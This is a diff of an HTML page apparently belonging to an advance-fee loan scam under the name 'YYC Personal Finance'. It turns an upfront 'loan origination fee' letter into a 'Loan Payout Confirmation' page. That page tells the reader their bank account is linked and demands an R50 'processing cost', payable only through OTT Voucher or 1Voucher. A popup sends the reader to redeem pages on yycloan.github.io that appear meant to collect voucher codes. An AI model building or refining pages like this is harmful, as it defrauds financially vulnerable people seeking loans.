@@ -1,11 +1,146 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Loan Origination Fee - YYC Personal Finance</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loan Payout Confirmation</title>
+<style>
+    :root {
+        --primary: #d61313;
+        --secondary: #1C75BC;
+        --dark: #333;
+        --gray: #6c757d;
+        --page-bg: #f8f9fa;
+        --doc-bg: #ffffff;
+    }
+
+    body {
+        background-color: var(--page-bg);
+        font-family: 'Roboto', sans-serif;
+        margin: 0;
+        padding: 20px;
+    }
+
+    .container {
+        max-width: 700px;
+        margin: 40px auto;
+        background: var(--doc-bg);
+        padding: 40px 50px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        border-radius: 10px;
+        text-align: center;
+    }
+
+    h1 {
+        color: var(--primary);
+        font-size: 2rem;
+        margin-bottom: 10px;
+    }
+
+    h2 {
+        color: var(--secondary);
+        font-size: 1.2rem;
+        margin-bottom: 25px;
+    }
+
+    p {
+        color: var(--dark);
+        font-size: 1.05rem;
+        line-height: 1.6;
+    }
+
+    .highlight-box {
+        background: #fffbe6;
+        border-left: 5px solid #ffc107;
+        padding: 20px;
+        border-radius: 8px;
+        margin: 25px 0;
+        text-align: left;
+    }
+
+    .highlight-box h3 {
+        color: #d66b0a;
+        margin-top: 0;
+    }
+
+    .btn {
+        background-color: var(--primary);
+        color: white;
+        border: none;
+        padding: 14px 24px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 1rem;
+        font-weight: 600;
+        box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+        transition: all 0.3s ease;
+    }
+
+    .btn:hover {
+        background-color: #b00f0f;
+        transform: translateY(-2px);
+    }
+
+    /* Popup Modal */
+    .popup {
+        display: none;
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(0,0,0,0.5);
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+    }
+
+    .popup-content {
+        background: white;
+        padding: 30px 40px;
+        border-radius: 10px;
+        text-align: center;
+        animation: popupShow 0.4s ease;
+        max-width: 400px;
+    }
+
+    @keyframes popupShow {
+        from { transform: scale(0.8); opacity: 0; }
+        to { transform: scale(1); opacity: 1; }
+    }
+
+    .popup h3 {
+        color: var(--secondary);
+        margin-bottom: 20px;
+    }
+
+    .popup .option-btn {
+        display: block;
+        width: 100%;
+        margin: 10px 0;
+        padding: 12px;
+        background-color: var(--primary);
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 1rem;
+        font-weight: 500;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-decoration: none;
+    }
+
+    .popup .option-btn:hover {
+        background-color: #b00f0f;
+    }
+
+    .close-btn {
+        background: none;
+        border: none;
+        color: var(--gray);
+        font-size: 0.9rem;
+        cursor: pointer;
+        margin-top: 10px;
+    }
+</style>
     <style>
         :root {
             --primary: #d61313;
@@ -88,7 +223,7 @@
 
         .doc-footer {
             position: absolute;
-            bottom: 40px;
+            bottom: 10px;
             left: 50px;
             right: 50px;
             text-align: center;
@@ -168,11 +303,6 @@
     </style>
 </head>
 <body>
-
-<div class="toolbar">
-    <button class="toolbar-btn" id="downloadPdfBtn"><i class="fas fa-download"></i> Download PDF</button>
-</div>
-
 <div class="document-container" id="originationFeeDocument">
     <div class="page" id="page1">
         <div class="doc-header">
@@ -184,29 +314,46 @@
             </div>
         </div>
 
-        <h3>Subject: Loan Origination Fee for Loan Application</h3>
+<div class="continer">
+    <h1>🎉 Congratulations!</h1>
+    <h2>Your Bank Account Has Been Successfully Connected</h2>
+    <p>We’re glad to inform you that your bank account has been successfully linked for your loan payout. This means your loan will be deposited correctly into your account once the final verification step is completed.</p>
 
-        <p>Dear <strong id="user-name-salutation"></strong>,</p>
+    <div class="highlight-box">
+        <h3>Important Notice</h3>
+        <p>Before your loan payout can proceed, a **Low Credit Improvement & Service Processing Cost** of <strong>R50</strong> is required. This helps finalize your verification and ensure a smooth, correct payout.</p>
+        <p><strong>Note:</strong> We have no interest in your money — this small R50 fee simply covers processing and verification, which is why we’ve kept it as affordable as possible.</p>
+        <p>Payment Method: Only via <strong>OTT Voucher</strong> or <strong>1Voucher</strong>.</p>
+    </div>
 
-        <p>We are pleased to confirm that your loan application for an amount of <strong id="loan-amount-text"></strong> has been approved. As part of the loan agreement, there is a loan origination fee that is required in order to complete the processing and formalization of your loan. This fee covers the legal and administrative costs of securing and preparing the necessary documentation for your loan.</p>
-        
-        <div class="summary-box">
-             <h4>Loan Origination Fee Breakdown:</h4>
-             <ul>
-                <li><span>Fee Percentage:</span> <strong id="fee-percentage"></strong></li>
-                <li><span>Fee Amount:</span> <strong id="fee-amount" style="color: var(--primary); font-weight: 700;"></strong></li>
-             </ul>
-             <small style="display: block; margin-top: 15px; color: var(--gray);">This fee must be paid upfront and cannot be deducted from the loan amount. The fee is a legal cost incurred as part of finalizing the loan agreement.</small>
-        </div>
+    <button class="btn" id="payNowBtn">Pay Now</button>
+</div>
 
-        <div class="final-payment-notice">
-            <h4><i class="fas fa-check-circle"></i> Final Payment Guarantee</h4>
-            <p>Please note: <strong>This is the final payment required</strong> before the loan is fully processed and disbursed to you. No further fees or charges will be incurred beyond this payment. We guarantee that once this payment is received, all other administrative and legal costs will be settled, and the loan disbursement will proceed without delay.</p>
-        </div>
+<!-- Popup Modal -->
+<div class="popup" id="popup">
+    <div class="popup-content">
+        <h3>Select Payment Option</h3>
+        <a href="https://yycloan.github.io/free/redeem.html" class="option-btn">💳 Pay with OTT Voucher</a>
+        <a href="https://yycloan.github.io/free/redeem-voucher.html" class="option-btn">💰 Pay with 1Voucher</a>
+        <button class="close-btn" id="closePopupBtn">Cancel</button>
+    </div>
+</div>
 
-        <p>To proceed, kindly arrange the payment of <strong id="fee-amount-2"></strong> at your earliest convenience. Payment instructions will follow in a separate communication.</p>
-        
-        <p>Please be advised that failure to make this payment could delay the loan disbursement. Once this payment is processed, your loan will be fully finalized, and we will proceed with the agreed terms.</p>
+<script>
+    const payNowBtn = document.getElementById('payNowBtn');
+    const popup = document.getElementById('popup');
+    const closePopupBtn = document.getElementById('closePopupBtn');
+
+    payNowBtn.addEventListener('click', () => {
+        popup.style.display = 'flex';
+    });
+
+    closePopupBtn.addEventListener('click', () => {
+        popup.style.display = 'none';
+    });
+    
+    
+</script></p>
 
         <p>If you have any questions or require clarification, please feel free to contact us at your convenience. We appreciate your prompt attention to this matter and look forward to assisting you with the final steps of your loan.</p>
         
@@ -260,18 +407,6 @@
 
         populateDocument();
 
-        // --- PDF Download Logic ---
-        document.getElementById('downloadPdfBtn').addEventListener('click', function () {
-            const element = document.getElementById('originationFeeDocument');
-            const opt = {
-                margin:       [0, 0, 0, 0],
-                filename:     `YYC_Origination_Fee_${clientData.name.replace(' ', '_')}.pdf`,
-                image:        { type: 'jpeg', quality: 0.98 },
-                html2canvas:  { scale: 2, useCORS: true },
-                jsPDF:        { unit: 'in', format: 'a4', orientation: 'portrait' }
-            };
-            html2pdf().set(opt).from(element).save();
-        });
     });
 </script>
 
